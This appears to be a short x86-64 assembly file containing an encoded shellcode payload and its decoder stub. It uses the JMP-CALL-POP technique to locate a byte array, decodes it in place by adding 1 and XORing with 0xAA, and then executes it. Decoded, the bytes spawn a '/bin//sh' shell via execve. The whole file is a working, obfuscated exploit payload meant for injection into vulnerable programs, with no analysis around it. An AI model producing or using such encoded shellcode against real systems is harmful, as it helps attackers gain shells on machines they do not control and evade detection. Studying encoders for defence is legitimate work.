global _start			

section .text
_start:

	jmp short call_decoder	; jump short to call_decoder procedure

decoder: 
	pop rsi			; pop memory address pointing at shellcode from the stack

decode:
	add byte [rsi], 0x1	; add 1 byte
	xor byte [rsi], 0xAA	; xor the added value with the key to retrieve initial value
	jz Shellcode		; jump if 0 (when the shellcode is decrypted)
	inc rsi			; increment esi to go to next byte

	jmp short decode	; jump short to decode procedure to continue decrypting

call_decoder:

	call decoder
	Shellcode: db 0xe1,0x9a,0x69,0xf9,0xe1,0x10,0x84,0xc7,0xc2,0xc3,0x84,0x84,0xd8,0xc1,0xf8,0xe1,0x22,0x4c,0xf9,0xe1,0x22,0x47,0xfc,0xe1,0x22,0x4b,0xe1,0x28,0x69,0x90,0xa4,0xae,0xa9
